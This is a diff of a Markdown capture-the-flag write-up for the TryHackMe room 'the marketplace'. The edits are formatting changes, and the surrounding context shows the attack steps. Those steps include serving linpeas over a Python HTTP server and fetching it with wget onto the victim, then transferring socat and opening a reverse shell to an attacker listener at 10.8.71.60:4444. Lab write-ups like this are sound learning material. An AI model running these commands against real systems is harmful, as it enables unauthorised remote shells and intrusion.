@@ -68,7 +68,7 @@ We can use the browser dev kit or a cookie extention to add the cookie to our br
 
 ![alt text](img/admin.png?raw=true "admin")
 
-*There's the first flag*
+### There's the first flag
 
 ## 2nd flag
 
@@ -123,7 +123,7 @@ Succes!
 
 ![alt text](img/ssh.png?raw=true "ssh")
 
-*There's the second flag*
+### There's the second flag
 
 
 ## 3rd flag
@@ -135,8 +135,11 @@ We can start the process with some linux enum scripts. I usualy use this [linpea
 Since we cannot acces the internet on the THM boxes we need to again setup a simple http server and transfer over the script inside a dir where we have write permissions.
 
 *attacking box*
+
 ```python3 -m http.server 4013```
+
 *victim box*
+
 ```wget http://10.8.71.60:4013/linpeas.sh```
 
 After that we make it executable
@@ -199,13 +202,21 @@ We are going to use a technique where we transfer over a precompiled binary of t
 after that:
 
 *attacking box*
+
 ```python3 -m http.server 4013```
+
 *victim unstable shell*
+
 ```wget http://10.8.71.60:4013/socat```
+
 *attacking box*
+
 ```socat file:`tty`,raw,echo=0 tcp-listen:4444```
+
 *victim unstable shell*
+
 ```chmod 777 ./socat```
+
 ```./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.8.71.60:4444```
 
 
@@ -230,7 +241,7 @@ this means we can use the following command to escelate our privlages.
 
 ![alt text](img/flag3.png?raw=true "flag3")
 
-*And that is flag 3!*
+### And that is flag 3!
 
 That was my writeup for 'the marketplace' room on THM.
 Thanks for reading, Suggestions & Feedback are appreciated !
